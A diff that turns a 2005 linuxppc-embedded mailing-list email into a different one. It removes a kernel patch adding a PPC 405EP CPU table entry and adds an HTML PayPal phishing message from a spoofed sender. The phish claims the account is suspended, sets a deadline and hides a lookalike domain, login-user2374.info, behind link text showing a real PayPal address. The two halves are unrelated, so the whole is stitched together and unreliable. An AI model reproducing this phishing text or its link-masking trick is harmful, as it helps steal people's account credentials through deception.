@@ -1,18 +1,19 @@
-Return-Path: <ebs@ebshome.net>
-Received: from gate.ebshome.net (gate.ebshome.net [64.81.67.12])
-	(using TLSv1 with cipher EDH-RSA-DES-CBC3-SHA (168/168 bits))
-	(Client CN "gate.ebshome.net", Issuer "gate.ebshome.net" (not verified))
-	by ozlabs.org (Postfix) with ESMTP id 40008679F6
+Return-Path: <sam@ss.lokal.ca>
+Received: from ss.lokal.ca (unknown [208.38.21.30])
+	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
+	(Client did not present a certificate)
+	by ozlabs.org (Postfix) with ESMTP id A0ADD679FD
 	for <linuxppc-embedded@ozlabs.org>;
-	Tue,  7 Jun 2005 11:20:12 +1000 (EST)
-Date: Mon, 6 Jun 2005 18:20:09 -0700
-From: Eugene Surovegin <ebs@ebshome.net>
-To: Andrew Morton <akpm@osdl.org>
-Message-ID: <20050607012009.GB16387@gate.ebshome.net>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: linuxppc-embedded@ozlabs.org
-Subject: [PATCH] ppc32: add 405EP cpu_spec entry
+	Tue,  7 Jun 2005 12:24:09 +1000 (EST)
+Received: from ss.lokal.ca (localhost.localdomain [127.0.0.1])
+	by ss.lokal.ca (8.12.10/8.12.10) with ESMTP id j56JMWSW023295
+	for <linuxppc-embedded@ozlabs.org>; Mon, 6 Jun 2005 13:22:32 -0600
+Date: Mon, 6 Jun 2005 13:22:32 -0600
+Message-Id: <200506061922.j56JMWjk023290@ss.lokal.ca>
+To: linuxppc-embedded@ozlabs.org
+From: "accounting@paypal.com" <service@paypal.com>
+Content-Type: text/html
+Subject: Verify your PayPal Account 
 List-Id: Linux on Embedded PowerPC Developers Mail List
 	<linuxppc-embedded.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
@@ -23,37 +24,32 @@ List-Help: <mailto:linuxppc-embedded-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
 	<mailto:linuxppc-embedded-request@ozlabs.org?subject=subscribe>
 
-Andrew,
 
-the following patch adds definition for PPC 405EP which was lost 
-somehow during 2.4 -> 2.6 transition.
-
-Recent change to arch/ppc/kernel/misc.S ("Fix incorrect CPU_FTR fixup 
-usage for unified caches") triggered this bug and 405EP boards don't 
-boot anymore.
-
-Please, consider applying this patch before 2.6.12 release.
-
-Signed-off-by: Eugene Surovegin <ebs@ebshome.net>
-
-diff --git a/arch/ppc/kernel/cputable.c b/arch/ppc/kernel/cputable.c
---- a/arch/ppc/kernel/cputable.c
-+++ b/arch/ppc/kernel/cputable.c
-@@ -838,6 +838,17 @@ struct cpu_spec	cpu_specs[] = {
- 		.icache_bsize		= 32,
- 		.dcache_bsize		= 32,
- 	},
-+	{	/* 405EP */
-+		.pvr_mask		= 0xffff0000,
-+		.pvr_value		= 0x51210000,
-+		.cpu_name		= "405EP",
-+		.cpu_features		= CPU_FTR_SPLIT_ID_CACHE |
-+			CPU_FTR_USE_TB,
-+		.cpu_user_features	= PPC_FEATURE_32 |
-+			PPC_FEATURE_HAS_MMU | PPC_FEATURE_HAS_4xxMAC,
-+		.icache_bsize		= 32,
-+		.dcache_bsize		= 32,
-+	},
- 
- #endif /* CONFIG_40x */
- #ifdef CONFIG_44x
+<br><br>
+We recently have determined that different computers have logged into your 
+PayPal account, and multiple password failures
+were present before the login. One of our Customer Service employees has 
+already tryed to telephonically reach you. As our employee
+did not manage to reach you, this email has been sent to your notice.<br>
+Therefore your account has been temporary suspended. We need you to 
+confirm your identity in
+order to regain full privileges of your account.<br>
+If this is not completed by <strong>June 08, 2005</strong>, we reserve 
+the right to terminate all privileges of your account
+indefinitly, as it may have been used for fraudulent purposes. We thank 
+you for your cooperation in this manner.<br>
+To confirm your identity please follow the link below:<br>
+<br>
+<a 
+href="http://paypal.com.login-user2374.info/webscr.php?cmd=LogIn">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a>
+<br>
+<br><br>
+<br>
+<br>
+Thank you for your patience in this matter.
+<br><br>
+PayPal - Customer Service
+<br><br>
+Please do not reply to this e-mail as this is only a notification. Mail 
+sent to this address cannot be answered.
+<br>
